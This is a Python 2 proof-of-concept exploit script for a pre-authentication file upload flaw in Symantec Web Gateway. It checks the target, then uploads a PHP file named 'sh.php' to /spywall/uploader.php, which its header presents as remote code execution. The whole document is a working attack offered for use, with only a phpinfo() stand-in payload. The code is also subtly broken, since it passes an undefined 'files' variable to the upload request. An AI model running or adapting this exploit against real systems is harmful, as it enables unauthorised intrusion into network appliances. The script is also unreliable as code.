
#!/usr/bin/env python
# seemantech.py - small preauth poc for symantec web gateway
# 27.03.2020 by code610
#
# more : https://twitter.com/CodySixteen
#        https://code610.blogspot.com
#
# to use this bug:
#   - uploads folder must exists on remote host
#   - and it must be writable
#
# have fun
#
import sys, re
import requests

target = sys.argv[1]

def main():
  print 'symantec web gateway preauth rce poc'
  print '      seemantech.py - vs - %s' % ( target )
  print ''

  baseUrl = target
  uploadUrl = target + '/uploads/'

  checkBase = requests.get(target,verify=False)
  check_status = checkBase.status_code

  if check_status == 200:
    print '[+] target alive, checking uploads'

    checkUpload = requests.get(uploadUrl, verify=False)
    isthereupload = checkUpload.status_code

    if isthereupload == 200:
      print '[+] uploads exists! continuing...'

      uploader = target + '/spywall/uploader.php'
      upshell = open('sh.php','w')
      upshell.write('<?php phpinfo();')
      upshell.close()
      up_data = {
        'file':open('sh.php','rb')
      }

      upme = requests.post(uploader, files=files, verify=False)
      upresp = upme.text
      print upresp

# run me:
if __name__ == '__main__':
  main()
